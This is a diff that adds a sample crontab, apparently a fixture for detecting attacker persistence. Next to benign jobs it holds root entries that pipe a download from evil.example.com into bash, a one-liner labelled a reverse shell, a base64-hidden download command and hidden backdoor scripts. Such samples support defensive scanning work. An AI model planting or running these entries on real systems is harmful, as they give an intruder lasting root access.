@@ -1,0 +1,24 @@
+# /etc/crontab sample with attacker persistence injected
+SHELL=/bin/bash
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+# Daily log rotation - benign
+0 2 * * * root /usr/sbin/logrotate /etc/logrotate.conf
+
+# Hourly system stats - benign
+0 * * * * root /usr/local/bin/collect-metrics.sh
+
+# Attacker persistence - high frequency, world-writable
+*/5 * * * * root /tmp/.x > /dev/null 2>&1 &
+
+# Remote payload pipe - critical
+0 0 * * * root curl http://evil.example.com/p | bash
+
+# Reverse shell oneliner - critical
+*/1 * * * * root python -c 'import socket;s=socket.socket();s.connect(("10.0.0.1",4444))'
+
+# Base64 obfuscated payload
+@hourly root echo aHR0cDovL2V2aWwuZXhhbXBsZS5jb20vc2hlbGwuc2g= | base64 -d | xargs curl
+
+# World-writable bin
+30 3 * * * root /var/tmp/backdoor.sh
